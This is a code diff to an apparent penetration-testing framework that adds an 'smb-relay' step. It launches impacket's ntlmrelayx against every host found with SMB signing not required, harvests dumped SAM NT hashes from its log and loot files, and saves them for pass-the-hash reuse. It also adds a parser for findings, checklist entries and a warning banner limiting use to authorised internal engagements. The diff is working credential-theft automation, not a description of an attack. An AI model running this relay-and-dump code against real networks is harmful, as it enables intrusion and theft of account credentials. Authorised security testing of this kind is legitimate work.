@@ -2223,6 +2223,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ag) smb-relay: NTLM relayed to a signing-off host → SAM hashes dumped remotely
+    if sid == "smb-relay":
+        hits = re.findall(r"^✗ SAM (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                "summary": f"NTLM relay → SAM: {shown}"[:140]}
+
     # 2af) smb-poison: NetNTLM hashes captured via LLMNR/NBT-NS poisoning → crack/relay
     if sid == "smb-poison":
         hits = re.findall(r"^✗ HASH (.+)$", output, re.M)
@@ -2876,7 +2885,7 @@ _EXPLOIT_STEPS = {
         ("SYSVOL / NETLOGON GPP loot", "smb-gpp"),
         # ── poison & relay (no creds) ──
         ("Poison LLMNR / NBT-NS → capture NetNTLM", "smb-poison"),
-        "NTLM relay (signing not required)",
+        ("NTLM relay (signing not required)", "smb-relay"),
         "Coerce auth → relay to escalate",
         # ── DC-critical CVEs ──
         "DC CVEs: ZeroLogon, noPac",
@@ -9098,6 +9107,108 @@ def _tool_smb_poison(ip: str, port: int, proto: str) -> str:
     return f"LLMNR/NBT-NS poisoning — {iface}  (active capture)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 6: NTLM relay to signing-off hosts → dump SAM ─────────────────────
+_SMBRELAY_DEADLINE = 600         # s — how long ntlmrelayx listens before self-stopping
+
+
+def _gather_relay_targets() -> list:
+    """Every host where smb-enum found SMB signing 'not required' — the valid relay targets."""
+    targets = []
+    for row in fetch_hosts():
+        hip = row[0]
+        for _port, _proto, script, _state, _cve, _risk, summary in fetch_vulns(hip):
+            if script == "smb-enum" and "signing not required" in (summary or "").lower():
+                if hip not in targets:
+                    targets.append(hip)
+                break
+    return targets
+
+
+def _parse_sam_dump(text: str) -> list:
+    """(user, nthash) pairs from pwdump-format SAM output (user:rid:lm:nt:::)."""
+    return [(u, nt) for u, nt in
+            re.findall(r"^(\S+?):\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::", text or "", re.M)]
+
+
+def _tool_smb_relay(ip: str, port: int, proto: str) -> str:
+    """SMB step 6 tool: ACTIVE NTLM relay with ntlmrelayx to every host where smb-enum found
+    SMB signing 'not required', dumping SAM on a successful relay. Runs for a bounded window
+    then self-stops (like the timed HTTP tools). It only listens/relays — a driver must make
+    a victim authenticate to us: run poison (step 5) or coerce (step 7) alongside. Dumped
+    hashes land in the DB (findings + smb-creds for pass-the-hash). Requires root. This
+    executes against third-party hosts — authorised internal engagements ONLY."""
+    import signal
+    import tempfile
+    if not _is_root():
+        raise RuntimeError("ntlmrelayx needs root (binds SMB/HTTP) — re-launch under sudo")
+    exe = shutil.which("impacket-ntlmrelayx") or shutil.which("ntlmrelayx.py")
+    if not exe:
+        raise RuntimeError("ntlmrelayx not found — install impacket to relay NTLM")
+    targets = _gather_relay_targets()
+    if not targets:
+        raise RuntimeError("no signing-off relay targets — run smb-enum first "
+                           "(needs a host with SMB signing 'not required')")
+
+    workdir = tempfile.mkdtemp(prefix="pshunter_relay_")
+    tf = os.path.join(workdir, "targets.txt")
+    with open(tf, "w") as fh:
+        fh.write("\n".join(f"smb://{t}" for t in targets) + "\n")
+    logf = os.path.join(workdir, "relay.log")
+    with open(logf, "w") as lf:
+        proc = subprocess.Popen([exe, "-tf", tf, "-smb2support"], cwd=workdir,
+                                stdout=lf, stderr=subprocess.STDOUT,
+                                stdin=subprocess.DEVNULL, start_new_session=True)
+    try:
+        proc.wait(timeout=_SMBRELAY_DEADLINE)
+    except subprocess.TimeoutExpired:
+        proc.send_signal(signal.SIGINT)
+        try:
+            proc.wait(timeout=15)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+
+    dumped, seen = [], set()                      # (target_ip, user, nthash)
+    try:
+        log_text = open(logf, errors="ignore").read()
+    except OSError:
+        log_text = ""
+    for u, nt in _parse_sam_dump(log_text):       # ntlmrelayx prints SAM to stdout…
+        if (u, nt) not in seen:
+            seen.add((u, nt))
+            dumped.append((targets[0] if len(targets) == 1 else "?", u, nt))
+    try:                                          # …and writes <ip>_samhashes.sam loot files
+        for fn in os.listdir(workdir):
+            m = re.match(r"(\d+\.\d+\.\d+\.\d+).*sam", fn, re.I)
+            if not m:
+                continue
+            for u, nt in _parse_sam_dump(open(os.path.join(workdir, fn), errors="ignore").read()):
+                if (u, nt) not in seen:
+                    seen.add((u, nt))
+                    dumped.append((m.group(1), u, nt))
+    except OSError:
+        pass
+
+    if dumped:                                     # persist NT hashes for pass-the-hash exec
+        blocks = _load_manual_block(ip, port, proto, "smb-creds")
+        for tip, user, nt in dumped:
+            line = f"! {user}:{nt} @ relayed SAM {tip} [{tip}]"
+            blocks.setdefault(tip, [])
+            if line not in blocks[tip]:
+                blocks[tip].append(line)
+        _save_manual_block(ip, port, proto, "smb-creds", blocks)
+
+    lines = [f"[*] Relay targets (signing not required): {', '.join(targets)}",
+             f"[*] ntlmrelayx ran up to {_SMBRELAY_DEADLINE // 60} min · "
+             f"dumped {len(dumped)} account(s)"]
+    for tip, user, nt in dumped:
+        lines.append(f"✗ SAM {tip} {user}:{nt}")
+    if dumped:
+        lines.append("· pass-the-hash → step 10 (creds saved to smb-creds)")
+    else:
+        lines.append("· nothing relayed — run poison (r5) or coerce (r7) alongside to drive auth")
+    return f"NTLM relay → SAM — {len(targets)} target(s)  (active, timed)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9132,6 +9243,7 @@ _STEP_TOOLS = {
     "smb-loot": ("SMB share loot (smbclient, read-only, in-memory grep → creds/secrets)", _tool_smb_loot),
     "smb-gpp": ("SYSVOL/NETLOGON GPP loot (netexec + smbclient, creds-aware, DC)", _tool_smb_gpp),
     "smb-poison": ("LLMNR/NBT-NS poisoning → NetNTLM capture (Responder, timed, root)", _tool_smb_poison),
+    "smb-relay": ("NTLM relay → SAM dump (ntlmrelayx, signing-off targets, timed, root)", _tool_smb_relay),
 }
 
 def _mins(seconds: int) -> str:
@@ -9181,6 +9293,7 @@ _STEP_TOOL_RUNS = {
     "smb-loot":         ("smbclient + gpp-decrypt", f"{_mins(_SMBLOOT_DEADLINE)} min"),
     "smb-gpp":          ("netexec + smbclient", f"{_mins(_SMBGPP_DEADLINE)} min"),
     "smb-poison":       ("Responder", f"{_mins(_SMBPOISON_DEADLINE)} min"),
+    "smb-relay":        ("ntlmrelayx", f"{_mins(_SMBRELAY_DEADLINE)} min"),
 }
 
 
@@ -9342,6 +9455,13 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-relay":                   # active relay + remote SAM dump — loud gate
+        root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
+        n = len(_gather_relay_targets())
+        print(f"{YELLOW}   ⚠ ACTIVE NTLM relay{RESET}{DIM} — relays inbound auth to {BOLD}{n}{RESET}"
+              f"{DIM} signing-off host(s) & dumps SAM · needs a driver ({BOLD}poison r5{RESET}{DIM} / "
+              f"{BOLD}coerce r7{RESET}{DIM}) · ntlmrelayx up to {_SMBRELAY_DEADLINE // 60} min · "
+              f"{RESET}{root}{DIM} · {RESET}{YELLOW}authorised internal engagements only{RESET}")
     if tool_key == "smb-poison":                  # active whole-segment poisoning — loud gate
         root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
         print(f"{YELLOW}   ⚠ ACTIVE LLMNR/NBT-NS/mDNS poisoning{RESET}{DIM} — poisons the WHOLE local "
